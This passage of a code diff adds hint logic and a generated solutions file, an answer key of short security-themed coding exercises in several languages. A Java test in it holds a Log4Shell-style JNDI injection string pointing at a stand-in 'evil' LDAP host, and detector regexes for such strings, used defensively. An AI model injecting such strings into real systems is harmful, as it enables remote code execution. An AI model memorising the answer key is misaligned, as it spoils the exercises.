+      return { tier, title: p.pieces ? "Put the pieces in order" : "Put the lines in order", kind: "parsons", pieces: p.pieces, lines: p.shuffled, answer: p.lines,
+        html: p.pieces ? "The answer is a single line. Here are its pieces, shuffled. Put them in order to rebuild it." : "These are the lines of a working answer, shuffled. Put them in the right order. Indentation is kept as a clue." };
+    }
+    const fresh = !code || code.trim() === String(m.starter || "").trim();
+    if (fresh && steps.length) return { tier, title: "Where to start", kind: "nudge", step: 0, html: `Start with step 1: ${steps[0]}` };
+    const unmet = RA.requirements(m, code).filter((r) => !r.ok);
+    if (unmet.length) {
+      const k = relatedStep(steps, unmet[0].hint);
+      return { tier, title: "Next requirement", kind: "nudge", step: k, html: `${esc(unmet[0].hint)}${k >= 0 ? `<br><span class="tiny">Step ${k + 1} covers this: ${steps[k]}</span>` : ""}` };
+    }
+    const fail = report && report.results && report.results.find((r) => r.status === "FAIL");
+    if (fail) return { tier, title: `Checkpoint: ${fail.label}`, kind: "nudge", html: RA.explain(m, fail) };
+    if (report && RA.allPassed(report)) return { tier, title: "All clear", kind: "nudge", html: "Every checkpoint passes. Explain your solution in one sentence to lock it in." };
+    return { tier, title: "Structure looks right", kind: "nudge", html: "Every requirement is in place. Now run the checkpoints to test how it behaves. If one fails, it will be explained here." };
+  };
+})(typeof window !== "undefined" ? window : globalThis);
+
+"""##,
     // web/curriculum/checkpoints.js
     ##"""
 // generated by tools/build.js. Do not edit.
@@ -2916,7 +4449,7 @@ TEST(Buffer, ThrowsOutOfRange) { Buffer b(4); EXPECT_THROW(b.at(4), std::out_of_
     // web/curriculum/solutions.js
     ##"""
 // generated by tools/build.js. Do not edit.
-(function (g) { const RA = g.RA = g.RA || {}; RA.SOLUTIONS = Object.assign(RA.SOLUTIONS || {}, {"cpp1":"#include <iostream>\n#include <string>\n\nstd::string intro(const std::string& handle, int level) {\n    return \"Agent \" + handle + \" // level \" + std::to_string(level);\n}\n\nint main() {\n    const std::string handle = \"neo\";\n    auto line = intro(handle, 3);\n    std::cout << line << '\\n';\n}\n","cpp10":"#include <algorithm>\n#include <numeric>\n#include <ranges>\n#include <string>\n#include <vector>\n#include <cstdio>\n\nstruct Hit {\n    std::string ip;\n    int count;\n};\n\nint analyze(std::vector<Hit>& hits) {\n    std::ranges::sort(hits, std::greater{}, &Hit::count);\n    auto it = std::find_if(hits.begin(), hits.end(), [](const Hit& h) { return h.ip.starts_with(\"10.\"); });\n    int total = std::accumulate(hits.begin(), hits.end(), 0, [](int acc, const Hit& h) { return acc + h.count; });\n    int noisy = 0;\n    for (const auto& h : hits | std::views::filter([](const Hit& h) { return h.count > 20; })) {\n        noisy += h.count;\n    }\n    if (it != hits.end() && noisy > 0) std::printf(\"first internal: %s, noisy total %d\\n\", it->ip.c_str(), noisy);\n    return total;\n}\n","cpp11":"#include <thread>\n#include <mutex>\n#include <atomic>\n#include <vector>\n#include <string>\n#include <iostream>\n\nbool ping(const std::string&) { return true; }\n\nint sweep(const std::vector<std::string>& hosts) {\n    std::atomic<int> up{0};\n    std::mutex log_mutex;\n    std::vector<std::thread> workers;\n    for (const auto& h : hosts) {\n        workers.emplace_back([&up, &log_mutex, &h] {\n            if (ping(h)) {\n                ++up;\n                std::lock_guard<std::mutex> lock(log_mutex);\n                std::cout << h << \" up\\n\";\n            }\n        });\n    }\n    for (auto& t : workers) t.join();\n    return up.load();\n}\n","cpp12":"#include <memory>\n#include <stdexcept>\n#include <utility>\n#include <cstddef>\n#include <gtest/gtest.h>\n\nclass Buffer {\npublic:\n    explicit Buffer(std::size_t n) : data_(std::make_unique<int[]>(n)), size_(n) {}\n    Buffer(const Buffer&) = delete;\n    Buffer& operator=(const Buffer&) = delete;\n    Buffer(Buffer&& other) noexcept : data_(std::move(other.data_)), size_(std::exchange(other.size_, 0)) {}\n    Buffer& operator=(Buffer&& other) noexcept {\n        data_ = std::move(other.data_);\n        size_ = std::exchange(other.size_, 0);\n        return *this;\n    }\n    int& at(std::size_t i) {\n        if (i >= size_) throw std::out_of_range(\"Buffer::at\");\n        return data_[i];\n    }\n    std::size_t size() const { return size_; }\n\nprivate:\n    std::unique_ptr<int[]> data_;\n    std::size_t size_;\n};\n\nTEST(BufferTest, ThrowsOutOfRange) {\n    Buffer b(4);\n    EXPECT_THROW(b.at(4), std::out_of_range);\n}\n\nTEST(BufferTest, MoveTransfersOwnership) {\n    Buffer a(3);\n    Buffer b(std::move(a));\n    EXPECT_EQ(b.size(), 3u);\n    EXPECT_EQ(a.size(), 0u);\n}\n","cpp2":"enum class Level { Low, Medium, High, Critical };\n\nLevel classify(int score) {\n    if (score >= 90) return Level::Critical;\n    else if (score >= 60) return Level::High;\n    else if (score >= 30) return Level::Medium;\n    else return Level::Low;\n}\n\nconst char* name(Level l) {\n    switch (l) {\n        case Level::Low: return \"LOW\";\n        case Level::Medium: return \"MEDIUM\";\n        case Level::High: return \"HIGH\";\n        case Level::Critical: return \"CRITICAL\";\n    }\n    return \"?\";\n}\n","cpp3":"#include <iostream>\n#include <string>\n#include <vector>\n#include <unordered_map>\n\nstd::unordered_map<std::string, int> tally(const std::vector<std::string>& ips) {\n    std::unordered_map<std::string, int> counts;\n    for (const auto& ip : ips) {\n        ++counts[ip];\n    }\n    return counts;\n}\n\nvoid report(const std::vector<std::string>& ips) {\n    for (const auto& [ip, n] : tally(ips)) {\n        std::cout << ip << \": \" << n << '\\n';\n    }\n}\n","cpp4":"#include <string>\n#include <sstream>\n\nstd::size_t count_words(const std::string& text) {\n    std::istringstream in(text);\n    std::string word;\n    std::size_t n = 0;\n    while (in >> word) ++n;\n    return n;\n}\n\nvoid redact(std::string& msg) {\n    msg = \"[REDACTED]\";\n}\n\nstd::string scan(const std::string& host, int port = 443) {\n    return host + \":\" + std::to_string(port);\n}\n\nint demo() {\n    int threshold = 3;\n    auto noisy = [threshold](std::size_t words) { return words > static_cast<std::size_t>(threshold); };\n    return noisy(count_words(\"a b c d\")) ? 1 : 0;\n}\n","cpp5":"#include <string>\n#include <string_view>\n#include <cctype>\n\nstd::string caesar(std::string_view text, int shift) {\n    std::string out;\n    out.reserve(text.size());\n    int s = ((shift % 26) + 26) % 26;\n    for (char c : text) {\n        unsigned char u = static_cast<unsigned char>(c);\n        if (std::isalpha(u)) {\n            char base = std::isupper(u) ? 'A' : 'a';\n            out.push_back(static_cast<char>(base + (c - base + s) % 26));\n        } else {\n            out.push_back(c);\n        }\n    }\n    return out;\n}\n\nbool is_private(std::string_view ip) {\n    return ip.starts_with(\"10.\") || ip.starts_with(\"192.168.\");\n}\n","cpp6":"#include <string>\n#include <cstdio>\n\nclass Node {\npublic:\n    explicit Node(std::string name, int strength = 0) : name_(std::move(name)), strength_(strength) {}\n    int strength() const { return strength_; }\n    const std::string& name() const { return name_; }\n\nprivate:\n    std::string name_;\n    int strength_;\n};\n\nclass LogFile {\npublic:\n    explicit LogFile(const char* path) : f_(std::fopen(path, \"a\")) {}\n    ~LogFile() { if (f_) std::fclose(f_); }\n    LogFile(const LogFile&) = delete;\n    LogFile& operator=(const LogFile&) = delete;\n    void write(const char* line) { if (f_) std::fputs(line, f_); }\n\nprivate:\n    std::FILE* f_;\n};\n","cpp7":"#include <memory>\n#include <optional>\n#include <string>\n#include <string_view>\n#include <charconv>\n#include <vector>\n\nstruct Implant {\n    std::string id;\n};\n\nstd::optional<int> parse_port(std::string_view s) {\n    int value = 0;\n    auto [ptr, ec] = std::from_chars(s.data(), s.data() + s.size(), value);\n    if (ec != std::errc{} || ptr != s.data() + s.size() || value < 1 || value > 65535) {\n        return std::nullopt;\n    }\n    return value;\n}\n\nstd::vector<std::unique_ptr<Implant>> collect() {\n    std::vector<std::unique_ptr<Implant>> found;\n    std::unique_ptr<Implant> p = std::make_unique<Implant>(Implant{\"x-17\"});\n    found.push_back(std::move(p));\n    return found;\n}\n","cpp8":"#include <span>\n#include <optional>\n#include <vector>\n#include <cstddef>\n\nstd::optional<std::vector<std::byte>> heartbeat_reply(std::span<const std::byte> payload, std::size_t claimed) {\n    if (claimed > payload.size()) {\n        return std::nullopt;\n    }\n    auto echo = payload.first(claimed);\n    return std::vector<std::byte>(echo.begin(), echo.end());\n}\n","cpp9":"#include <concepts>\n#include <vector>\n#include <algorithm>\n\ntemplate <std::totally_ordered T>\nT strongest(const std::vector<T>& xs) {\n    return *std::max_element(xs.begin(), xs.end());\n}\n\ntemplate <typename T>\nclass Box {\npublic:\n    explicit Box(T v) : value_(v) {}\n    const T& get() const { return value_; }\n\nprivate:\n    T value_;\n};\n\nconstexpr int xp_for(int rank) { return 50 + 15 * rank; }\nstatic_assert(xp_for(2) == 80);\n","cs1":"static string Intro(string handle, int level) => $\"Agent {handle} // level {level}\";\n\nvar handle = \"neo\";\nConsole.WriteLine(Intro(handle, 3));\n","cs10":"static class Logs\n{\n    public static List<string> FailIps(IEnumerable<string> lines) =>\n        lines.Where(l => l.EndsWith(\"FAIL\"))\n             .Select(l => l.Split(' ')[0])\n             .ToList();\n\n    public static Dictionary<string, int> ByIp(IEnumerable<string> lines) =>\n        lines.Select(l => l.Split(' ')[0])\n             .GroupBy(ip => ip)\n             .ToDictionary(g => g.Key, g => g.Count());\n}\n","cs11":"static async Task<bool> PingAsync(string host, CancellationToken ct)\n{\n    await Task.Delay(50, ct);\n    return host.Length > 0;\n}\n\nstatic async Task<int> SweepAsync(IEnumerable<string> hosts, CancellationToken ct)\n{\n    var results = await Task.WhenAll(hosts.Select(h => PingAsync(h, ct)));\n    return results.Count(ok => ok);\n}\n\nusing var cts = new CancellationTokenSource(TimeSpan.FromSeconds(2));\nConsole.WriteLine(await SweepAsync([\"north\", \"harbor\", \"\"], cts.Token));\n","cs12":"using System;\nusing UnityEngine;\nusing Xunit;\n\npublic class SentryDrone : MonoBehaviour\n{\n    [SerializeField] private float speed = 2f;\n    [SerializeField] private float alertRange = 5f;\n    [SerializeField] private Transform target;\n\n    public event Action<float> TargetSpotted;\n\n    void Start()\n    {\n        Debug.Log(\"Sentry online\");\n    }\n\n    void Update()\n    {\n        transform.Rotate(0f, speed * 90f * Time.deltaTime, 0f);\n        if (target == null) return;\n        float d = Vector3.Distance(transform.position, target.position);\n        if (d < alertRange) TargetSpotted?.Invoke(d);\n    }\n\n    public static bool InRange(float distance, float range) => distance < range;\n}\n\npublic class SentryDroneTests\n{\n    [Fact]\n    public void DetectsTargetInsideRange()\n    {\n        Assert.Equal(true, SentryDrone.InRange(3f, 5f));\n    }\n}\n","cs2":"static string ThreatLevel(int score) => score switch\n{\n    >= 90 => \"CRITICAL\",\n    >= 60 => \"HIGH\",\n    >= 30 => \"MEDIUM\",\n    _ => \"LOW\",\n};\n\nforeach (var s in new[] { 95, 61, 12 })\n    Console.WriteLine($\"{s}: {ThreatLevel(s)}\");\n","cs3":"static Dictionary<string, int> Tally(List<string> ips)\n{\n    var counts = new Dictionary<string, int>();\n    foreach (var ip in ips)\n        counts[ip] = counts.GetValueOrDefault(ip) + 1;\n    return counts;\n}\n\nvar tally = Tally([\"10.0.0.4\", \"10.0.0.4\", \"8.8.8.8\"]);\nif (tally.TryGetValue(\"10.0.0.4\", out var hits))\n    Console.WriteLine($\"10.0.0.4 hit {hits} times\");\n","cs4":"static string Scan(string host, int port = 443) => $\"{host}:{port}\";\n\nstatic bool TryParsePort(string s, out int port) =>\n    int.TryParse(s, out port) && port is >= 1 and <= 65535;\n\nstatic (int Up, int Down) Count(bool[] results) =>\n    (results.Count(r => r), results.Count(r => !r));\n\nConsole.WriteLine(Scan(\"relay.example\", port: 8443));\n","cs5":"using System.Text;\n\nconst string Brief = \"\"\"\n    Operator,\n    decode the \"relay\" before dawn.\n    \"\"\";\n\nstatic string Caesar(string text, int shift)\n{\n    var sb = new StringBuilder(text.Length);\n    int s = ((shift % 26) + 26) % 26;\n    foreach (char c in text)\n    {\n        if (char.IsLetter(c) && c < 128)\n        {\n            char b = char.IsUpper(c) ? 'A' : 'a';\n            sb.Append((char)(b + (c - b + s) % 26));\n        }\n        else sb.Append(c);\n    }\n    return sb.ToString();\n}\n","cs6":"record Node(string Name, int Strength = 0)\n{\n    public bool IsHot => Strength > 80;\n}\n\nclass Session\n{\n    public int Requests { get; private set; }\n    public required string Id { get; init; }\n    public void Hit() => Requests++;\n}\n\nclass Demo\n{\n    static void Run()\n    {\n        var a = new Node(\"north\", 40);\n        var b = a with { Strength = 90 };\n        var s = new Session { Id = \"s-1\" };\n        Console.WriteLine($\"{b.IsHot} {s.Id}\");\n    }\n}\n","cs7":"class BadPortException(string input) : Exception($\"bad port: {input}\")\n{\n    public string Input { get; } = input;\n}\n\nstatic class Ports\n{\n    public static int ParsePort(string s)\n    {\n        if (!int.TryParse(s, out var p) || p is < 1 or > 65535)\n            throw new BadPortException(s);\n        return p;\n    }\n\n    public static int Load(string path, string? fallback)\n    {\n        using var reader = new StreamReader(path);\n        var raw = reader.ReadLine() ?? fallback ?? \"443\";\n        try\n        {\n            return ParsePort(raw);\n        }\n        catch (BadPortException e) when (e.Input.Length > 0)\n        {\n            Console.Error.WriteLine(e.Message);\n            return 443;\n        }\n        finally\n        {\n            Console.WriteLine(\"parse attempted\");\n        }\n    }\n}\n","cs8":"interface IDetector\n{\n    bool Detect(string line);\n}\n\nabstract class Rule : IDetector\n{\n    public abstract bool Detect(string line);\n    public virtual string Label => \"rule\";\n}\n\nsealed class Keyword(string word) : Rule\n{\n    public override bool Detect(string line) => line.Contains(word);\n    public override string Label => $\"keyword:{word}\";\n}\n","cs9":"class Box<T>(T value)\n{\n    public T Value { get; } = value;\n}\n\nstatic class Generics\n{\n    public static T Strongest<T>(IEnumerable<T> xs) where T : IComparable<T>\n    {\n        T best = default!;\n        bool first = true;\n        foreach (var x in xs)\n        {\n            if (first || x.CompareTo(best) > 0) { best = x; first = false; }\n        }\n        return best;\n    }\n\n    public static T Fresh<T>() where T : new() => new T();\n}\n","go1":"package main\n\nimport \"fmt\"\n\nfunc intro(handle string, level int) string {\n\treturn fmt.Sprintf(\"Agent %s // level %d\", handle, level)\n}\n\nfunc main() {\n\tfmt.Println(intro(\"neo\", 3))\n}\n","go10":"package main\n\nimport \"sync\"\n\nfunc ping(h string) bool { return len(h) > 0 }\n\nfunc sweep(hosts []string) int {\n\tvar wg sync.WaitGroup\n\tvar mu sync.Mutex\n\tup := 0\n\tfor _, h := range hosts {\n\t\twg.Add(1)\n\t\tgo func(host string) {\n\t\t\tdefer wg.Done()\n\t\t\tif ping(host) {\n\t\t\t\tmu.Lock()\n\t\t\t\tup++\n\t\t\t\tmu.Unlock()\n\t\t\t}\n\t\t}(h)\n\t}\n\twg.Wait()\n\treturn up\n}\n","go11":"package main\n\nimport \"context\"\n\nfunc ping(h string) string { return h }\n\nfunc firstReply(ctx context.Context, hosts []string) (string, error) {\n\treplies := make(chan string, len(hosts))\n\tfor _, h := range hosts {\n\t\tgo func(host string) { replies <- ping(host) }(h)\n\t}\n\tselect {\n\tcase r := <-replies:\n\t\treturn r, nil\n\tcase <-ctx.Done():\n\t\treturn \"\", ctx.Err()\n\t}\n}\n","go12":"package main\n\nimport (\n\t\"encoding/json\"\n\t\"net/http\"\n\t\"testing\"\n)\n\ntype Status struct {\n\tNode string `json:\"node\"`\n\tUp   bool   `json:\"up\"`\n}\n\nfunc threatLevel(score int) string {\n\tswitch {\n\tcase score >= 90:\n\t\treturn \"CRITICAL\"\n\tcase score >= 60:\n\t\treturn \"HIGH\"\n\tcase score >= 30:\n\t\treturn \"MEDIUM\"\n\t}\n\treturn \"LOW\"\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/status\", func(w http.ResponseWriter, r *http.Request) {\n\t\tw.Header().Set(\"Content-Type\", \"application/json\")\n\t\tjson.NewEncoder(w).Encode([]Status{{\"north\", true}, {\"harbor\", false}})\n\t})\n\thttp.ListenAndServe(\":8080\", nil)\n}\n\nfunc TestThreatLevel(t *testing.T) {\n\tcases := []struct {\n\t\tscore int\n\t\twant  string\n\t}{{95, \"CRITICAL\"}, {60, \"HIGH\"}, {30, \"MEDIUM\"}, {0, \"LOW\"}}\n\tfor _, c := range cases {\n\t\tif got := threatLevel(c.score); got != c.want {\n\t\t\tt.Errorf(\"threatLevel(%d) = %q, want %q\", c.score, got, c.want)\n\t\t}\n\t}\n}\n","go2":"package main\n\nfunc threatLevel(score int) string {\n\tswitch {\n\tcase score >= 90:\n\t\treturn \"CRITICAL\"\n\tcase score >= 60:\n\t\treturn \"HIGH\"\n\tcase score >= 30:\n\t\treturn \"MEDIUM\"\n\tdefault:\n\t\treturn \"LOW\"\n\t}\n}\n","go3":"package main\n\nimport \"sort\"\n\nfunc tally(ips []string) map[string]int {\n\tcounts := make(map[string]int)\n\tfor _, ip := range ips {\n\t\tcounts[ip]++\n\t}\n\treturn counts\n}\n\nfunc uniqueSorted(ips []string) []string {\n\tout := []string{}\n\tfor ip := range tally(ips) {\n\t\tout = append(out, ip)\n\t}\n\tsort.Strings(out)\n\treturn out\n}\n","go4":"package main\n\nfunc makeCounter(start int) func() int {\n\tn := start\n\treturn func() int {\n\t\tn++\n\t\treturn n\n\t}\n}\n\nfunc minMax(nums ...int) (min, max int) {\n\tif len(nums) == 0 {\n\t\treturn\n\t}\n\tmin, max = nums[0], nums[0]\n\tfor _, n := range nums {\n\t\tif n < min {\n\t\t\tmin = n\n\t\t}\n\t\tif n > max {\n\t\t\tmax = n\n\t\t}\n\t}\n\treturn\n}\n","go5":"package main\n\nimport \"strings\"\n\nfunc caesar(text string, shift int) string {\n\tvar b strings.Builder\n\ts := rune(((shift % 26) + 26) % 26)\n\tfor _, r := range text {\n\t\tswitch {\n\t\tcase r >= 'a' && r <= 'z':\n\t\t\tb.WriteRune('a' + (r-'a'+s)%26)\n\t\tcase r >= 'A' && r <= 'Z':\n\t\t\tb.WriteRune('A' + (r-'A'+s)%26)\n\t\tdefault:\n\t\t\tb.WriteRune(r)\n\t\t}\n\t}\n\treturn b.String()\n}\n","go6":"package main\n\nimport \"fmt\"\n\ntype Node struct {\n\tName     string\n\tStrength int\n}\n\nfunc (n *Node) Boost(by int) int {\n\tn.Strength += by\n\treturn n.Strength\n}\n\nfunc (n Node) Label() string {\n\treturn fmt.Sprintf(\"%s(%d)\", n.Name, n.Strength)\n}\n\ntype Relay struct {\n\tNode\n\tHops int\n}\n","go7":"package main\n\nimport (\n\t\"errors\"\n\t\"fmt\"\n)\n\nvar ErrDenied = errors.New(\"access denied\")\n\nfunc unlock(code string) (string, error) {\n\tif code == \"0451\" {\n\t\treturn \"OPEN\", nil\n\t}\n\treturn \"\", fmt.Errorf(\"unlock %q: %w\", code, ErrDenied)\n}\n\nfunc safeUnlock(code string) string {\n\tres, err := unlock(code)\n\tif errors.Is(err, ErrDenied) {\n\t\treturn \"DENIED\"\n\t}\n\treturn res\n}\n","go8":"package main\n\nimport \"strings\"\n\ntype Detector interface {\n\tDetect(line string) bool\n}\n\ntype Keyword struct {\n\tWord string\n}\n\nfunc (k Keyword) Detect(line string) bool {\n\treturn strings.Contains(line, k.Word)\n}\n\nfunc countHits(d Detector, lines []string) int {\n\tn := 0\n\tfor _, l := range lines {\n\t\tif d.Detect(l) {\n\t\t\tn++\n\t\t}\n\t}\n\treturn n\n}\n","go9":"package main\n\ntype Number interface {\n\t~int | ~float64\n}\n\nfunc Filter[T any](xs []T, keep func(T) bool) []T {\n\tvar out []T\n\tfor _, x := range xs {\n\t\tif keep(x) {\n\t\t\tout = append(out, x)\n\t\t}\n\t}\n\treturn out\n}\n\nfunc Sum[N Number](xs []N) N {\n\tvar total N\n\tfor _, x := range xs {\n\t\ttotal += x\n\t}\n\treturn total\n}\n","js1":"function intro(handle, level) {\n  return `Agent ${handle} // level ${level}`;\n}\n","js10":"async function sweep(hosts, ping) {\n  const results = await Promise.allSettled(hosts.map(h => ping(h)));\n  const up = [], down = [];\n  results.forEach((r, i) => (r.status === \"fulfilled\" ? up : down).push(hosts[i]));\n  return { up, down };\n}\n","js11":"function deepEqual(a, b) {\n  if (a === b) return true;\n  if (a === null || b === null || typeof a !== \"object\" || typeof b !== \"object\") return false;\n  if (Array.isArray(a) !== Array.isArray(b)) return false;\n  const ka = Object.keys(a), kb = Object.keys(b);\n  if (ka.length !== kb.length) return false;\n  return ka.every(k => Object.hasOwn(b, k) && deepEqual(a[k], b[k]));\n}\n","js12":"const validIp = ip => /^(\\d{1,3})(\\.\\d{1,3}){3}$/.test(ip) && ip.split(\".\").every(p => +p <= 255 && String(+p) === p);\n\nasync function analyze(source) {\n  const lines = await source();\n  const fails = new Map();\n  let total = 0, skipped = 0, failCount = 0;\n  for (const line of lines) {\n    const parts = line.trim().split(/\\s+/);\n    if (parts.length !== 2 || !validIp(parts[0])) { skipped++; continue; }\n    total++;\n    if (parts[1] === \"FAIL\") { failCount++; fails.set(parts[0], (fails.get(parts[0]) ?? 0) + 1); }\n  }\n  let topIp = null, best = 0;\n  for (const [ip, n] of fails) if (n > best) { best = n; topIp = ip; }\n  return { total, fails: failCount, topIp, skipped };\n}\n","js2":"function threatLevel(score) {\n  if (score >= 90) return \"CRITICAL\";\n  if (score >= 60) return \"HIGH\";\n  if (score >= 30) return \"MEDIUM\";\n  return \"LOW\";\n}\n","js3":"function exposed(hosts) {\n  return hosts.filter(h => !h.patched).map(h => h.name).sort();\n}\n","js4":"function makeCounter(start = 0) {\n  let count = start;\n  return () => ++count;\n}\n","js5":"function isMalicious(input) {\n  return /\\$\\{\\s*jndi:/i.test(input);\n}\n","js6":"class Node {\n  constructor(name) { this.name = name; this.strength = 0; }\n  boost(n) { this.strength += n; return this.strength; }\n  get label() { return `${this.name}(${this.strength})`; }\n}\nclass Relay extends Node {\n  boost(n) { return super.boost(n * 2); }\n}\n","js7":"class AccessDenied extends Error {\n  constructor(msg) { super(msg); this.name = \"AccessDenied\"; }\n}\nfunction unlock(code) {\n  if (code === \"0451\") return \"OPEN\";\n  throw new AccessDenied(`bad code ${code}`);\n}\nfunction safeUnlock(code) {\n  try { return unlock(code); }\n  catch (e) { if (e instanceof AccessDenied) return \"DENIED\"; throw e; }\n}\n","js8":"function tally(items) {\n  const m = new Map();\n  for (const x of items) m.set(x, (m.get(x) ?? 0) + 1);\n  return Object.fromEntries(m);\n}\nfunction topN(items, n) {\n  return Object.entries(tally(items)).sort((a, b) => b[1] - a[1]).slice(0, n);\n}\n","js9":"function* chunks(arr, size) {\n  for (let i = 0; i < arr.length; i += size) yield arr.slice(i, i + size);\n}\nfunction* take(iter, n) {\n  if (n <= 0) return;\n  let i = 0;\n  for (const v of iter) { yield v; if (++i >= n) return; }\n}\n","jv1":"public class Intro {\n    static String intro(String handle, int level) {\n        return \"Agent \" + handle + \" // level \" + level;\n    }\n\n    public static void main(String[] args) {\n        var handle = \"neo\";\n        System.out.printf(\"%s%n\", intro(handle, 3));\n    }\n}\n","jv10":"import java.util.*;\nimport java.util.stream.*;\n\npublic class Streams {\n    static List<String> failIps(List<String> lines) {\n        return lines.stream()\n            .filter(l -> l.endsWith(\"FAIL\"))\n            .map(l -> l.split(\"\\\\s+\")[0])\n            .collect(Collectors.toList());\n    }\n\n    static Map<String, Long> byIp(List<String> lines) {\n        return lines.stream()\n            .map(l -> l.split(\"\\\\s+\")[0])\n            .collect(Collectors.groupingBy(ip -> ip, Collectors.counting()));\n    }\n}\n","jv11":"import java.util.*;\nimport java.util.concurrent.*;\nimport java.util.concurrent.atomic.*;\n\npublic class Sweep {\n    static boolean ping(String h) { return !h.isEmpty(); }\n\n    static int sweep(List<String> hosts) {\n        AtomicInteger up = new AtomicInteger();\n        try (var executor = Executors.newVirtualThreadPerTaskExecutor()) {\n            for (String h : hosts) {\n                executor.submit(() -> { if (ping(h)) up.incrementAndGet(); });\n            }\n        }\n        return up.get();\n    }\n\n    static String report(List<String> hosts) {\n        return CompletableFuture.supplyAsync(() -> sweep(hosts))\n            .thenApply(n -> n + \"/\" + hosts.size() + \" up\")\n            .join();\n    }\n}\n","jv12":"import java.util.regex.*;\nimport static org.junit.jupiter.api.Assertions.*;\nimport org.junit.jupiter.api.Test;\n\nsealed interface Event permits Login, Breach, Logout {}\nrecord Login(String user) implements Event {}\nrecord Breach(int severity) implements Event {}\nrecord Logout(String user) implements Event {}\n\nclass Triage {\n    private static final Pattern JNDI = Pattern.compile(\"\\\\$\\\\{\\\\s*jndi:\", Pattern.CASE_INSENSITIVE);\n\n    static String describe(Event e) {\n        return switch (e) {\n            case Login l -> l.user() + \" in\";\n            case Breach b when b.severity() >= 8 -> \"CRITICAL breach\";\n            case Breach b -> \"breach \" + b.severity();\n            case Logout o -> o.user() + \" out\";\n        };\n    }\n\n    static String sanitize(String input) {\n        return JNDI.matcher(input).find() ? \"[BLOCKED]\" : input;\n    }\n}\n\nclass TriageTest {\n    @Test\n    void describesCriticalBreach() {\n        assertEquals(\"CRITICAL breach\", Triage.describe(new Breach(9)));\n    }\n\n    @Test\n    void blocksLog4Shell() {\n        assertEquals(\"[BLOCKED]\", Triage.sanitize(\"${jndi:ldap://evil/a}\"));\n    }\n}\n","jv2":"public class Triage {\n    static String threatLevel(int score) {\n        if (score >= 90) return \"CRITICAL\";\n        else if (score >= 60) return \"HIGH\";\n        else if (score >= 30) return \"MEDIUM\";\n        else return \"LOW\";\n    }\n\n    static int portFor(String service) {\n        return switch (service) {\n            case \"ssh\" -> 22;\n            case \"http\" -> 80;\n            case \"https\", \"tls\" -> 443;\n            default -> -1;\n        };\n    }\n}\n","jv3":"import java.util.*;\n\npublic class Tally {\n    static Map<String, Integer> tally(List<String> ips) {\n        Map<String, Integer> counts = new HashMap<>();\n        for (String ip : ips) {\n            counts.merge(ip, 1, Integer::sum);\n        }\n        return counts;\n    }\n}\n","jv4":"public class Scanner {\n    static String scan(String host) {\n        return scan(host, 443);\n    }\n\n    static String scan(String host, int port) {\n        return host + \":\" + port;\n    }\n\n    static int sum(int... xs) {\n        int total = 0;\n        for (int x : xs) total += x;\n        return total;\n    }\n}\n","jv5":"public class Cipher {\n    static final String BRIEF = \"\"\"\n        Operator,\n        decode the relay before dawn.\n        \"\"\";\n\n    static String caesar(String text, int shift) {\n        StringBuilder sb = new StringBuilder();\n        int s = ((shift % 26) + 26) % 26;\n        for (char c : text.toCharArray()) {\n            if (Character.isUpperCase(c)) sb.append((char) ('A' + (c - 'A' + s) % 26));\n            else if (Character.isLowerCase(c)) sb.append((char) ('a' + (c - 'a' + s) % 26));\n            else sb.append(c);\n        }\n        return sb.toString();\n    }\n}\n","jv6":"record Node(String name, int strength) {\n    public Node {\n        if (name == null || name.isBlank()) throw new IllegalArgumentException(\"name required\");\n        if (strength < 0) throw new IllegalArgumentException(\"strength must be >= 0\");\n    }\n}\n\nclass Session {\n    private final String id;\n\n    Session(String id) {\n        this.id = id;\n    }\n\n    String id() { return id; }\n}\n\nenum Faction { LOGOS, SENTINEL, MERIDIAN }\n","jv7":"import java.io.*;\nimport java.nio.file.*;\n\nclass BadPortException extends Exception {\n    BadPortException(String msg, Throwable cause) { super(msg, cause); }\n}\n\npublic class Ports {\n    static int parsePort(String s) throws BadPortException {\n        try {\n            int p = Integer.parseInt(s);\n            if (p < 1 || p > 65535) throw new BadPortException(\"out of range: \" + p, null);\n            return p;\n        } catch (NumberFormatException e) {\n            throw new BadPortException(\"not a number: \" + s, e);\n        }\n    }\n\n    static long countLines(Path file) throws IOException {\n        try (BufferedReader reader = Files.newBufferedReader(file)) {\n            return reader.lines().count();\n        }\n    }\n}\n","jv8":"import java.util.*;\n\ninterface Detector {\n    boolean detect(String line);\n\n    default long count(List<String> lines) {\n        return lines.stream().filter(this::detect).count();\n    }\n}\n\nabstract class Rule implements Detector {\n    abstract String name();\n}\n\nclass Keyword extends Rule {\n    private final String word;\n\n    Keyword(String word) { this.word = word; }\n\n    @Override\n    public boolean detect(String line) { return line.contains(word); }\n\n    @Override\n    String name() { return \"keyword:\" + word; }\n}\n","jv9":"import java.util.*;\n\nclass Box<T> {\n    private final T value;\n    Box(T value) { this.value = value; }\n    T get() { return value; }\n}\n\nclass Generics {\n    static <T extends Comparable<T>> T strongest(List<T> xs) {\n        T best = null;\n        for (T x : xs) if (best == null || x.compareTo(best) > 0) best = x;\n        return best;\n    }\n\n    static double total(List<? extends Number> xs) {\n        double sum = 0;\n        for (Number n : xs) sum += n.doubleValue();\n        return sum;\n    }\n}\n","kt1":"fun intro(handle: String, level: Int): String = \"Agent $handle // level $level\"\n\nfun main() {\n    val handle = \"neo\"\n    var runs = 0\n    runs += 1\n    println(\"${intro(handle, 3)} (run $runs)\")\n}\n","kt10":"import kotlinx.coroutines.*\n\nsuspend fun ping(host: String): Boolean {\n    delay(50)\n    return host.isNotEmpty()\n}\n\nsuspend fun sweep(hosts: List<String>): Int = coroutineScope {\n    hosts.map { h -> async { ping(h) } }.awaitAll().count { it }\n}\n\nfun main() = runBlocking {\n    launch { println(\"heartbeat\") }\n    println(\"up: ${sweep(listOf(\"a\", \"b\", \"\"))}\")\n}\n","kt11":"import kotlin.test.*\n\nfun parsePort(s: String): Int {\n    val p = s.toIntOrNull() ?: throw IllegalArgumentException(\"bad port\")\n    require(p in 1..65535)\n    return p\n}\n\nclass PortParserTest {\n    @Test\n    fun parsesValidPort() {\n        assertEquals(443, parsePort(\"443\"))\n    }\n\n    @Test\n    fun rejectsGarbage() {\n        assertFailsWith<IllegalArgumentException> { parsePort(\"abc\") }\n    }\n}\n","kt12":"import androidx.compose.foundation.lazy.LazyColumn\nimport androidx.compose.foundation.lazy.items\nimport androidx.compose.material3.Button\nimport androidx.compose.material3.Text\nimport androidx.compose.runtime.*\nimport androidx.lifecycle.ViewModel\nimport androidx.lifecycle.viewModelScope\nimport kotlinx.coroutines.delay\nimport kotlinx.coroutines.flow.MutableStateFlow\nimport 